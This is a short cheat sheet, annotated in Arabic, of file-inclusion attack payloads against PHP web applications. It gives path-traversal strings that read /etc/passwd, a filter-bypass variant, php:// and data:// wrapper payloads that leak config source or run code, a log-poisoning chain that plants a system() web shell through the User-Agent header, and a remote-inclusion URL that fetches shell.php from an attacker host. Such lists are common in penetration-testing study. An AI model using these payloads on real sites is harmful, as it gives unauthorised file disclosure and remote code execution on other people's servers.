# File Inclusion (LFI / RFI)

## LFI أساسي
```text
http://<host>/page.php?file=../../../../etc/passwd
http://<host>/page.php?file=....//....//etc/passwd   (bypass فلترة ../)
```

## PHP Wrappers
```text
php://filter/convert.base64-encode/resource=config.php
php://input   (مع POST body يحتوي كود PHP)
data://text/plain;base64,<base64_php_code>
```

## Log Poisoning -> RCE
```text
1. اكتب PHP payload في الـ User-Agent أو أي حقل بيتسجل في اللوج
   User-Agent: <?php system($_GET['cmd']); ?>
2. اضبط ملف اللوج عبر LFI:
   file=/var/log/apache2/access.log&cmd=id
```

## RFI (لو allow_url_include مفعلة)
```text
http://<host>/page.php?file=http://<attacker_ip>/shell.php
```
